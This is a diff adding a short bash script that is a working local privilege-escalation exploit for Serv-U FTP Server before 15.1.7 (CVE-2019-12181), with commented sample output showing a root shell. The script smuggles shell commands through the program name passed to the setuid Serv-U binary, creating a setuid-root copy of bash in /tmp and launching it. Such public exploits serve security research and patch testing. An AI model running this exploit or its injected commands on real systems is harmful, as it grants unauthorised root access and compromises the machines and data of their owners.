@@ -1,0 +1,37 @@
+#!/bin/bash
+# SUroot - Local root exploit for Serv-U FTP Server versions prior to 15.1.7 (CVE-2019-12181)
+# Bash variant of Guy Levin's Serv-U FTP Server exploit:
+# - https://github.com/guywhataguy/CVE-2019-12181
+# ---
+# user@debian-9-6-0-x64-xfce:~/Desktop$ ./SUroot 
+# [*] Launching Serv-U ...
+# sh: 1: : Permission denied
+# [+] Success:
+# -rwsr-xr-x 1 root root 117208 Jun 28 23:21 /tmp/sh
+# [*] Launching root shell: /tmp/sh
+# sh-4.4# id
+# uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),117(scanner)
+# ---
+# <bcoles@gmail.com>
+# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-12181
+
+if ! test -u "/usr/local/Serv-U/Serv-U"; then
+  echo '[-] /usr/local/Serv-U/Serv-U is not setuid root'
+  exit 1
+fi
+
+echo "[*] Launching Serv-U ..."
+
+/bin/bash -c 'exec -a "\";cp /bin/bash /tmp/sh; chown root /tmp/sh; chmod u+sx /tmp/sh;\"" /usr/local/Serv-U/Serv-U -prepareinstallation'
+
+if ! test -u "/tmp/sh"; then
+  echo '[-] Failed'
+  /bin/rm "/tmp/sh"
+  exit 1
+fi
+
+echo '[+] Success:'
+/bin/ls -la /tmp/sh
+
+echo "[*] Launching root shell: /tmp/sh"
+/tmp/sh -p
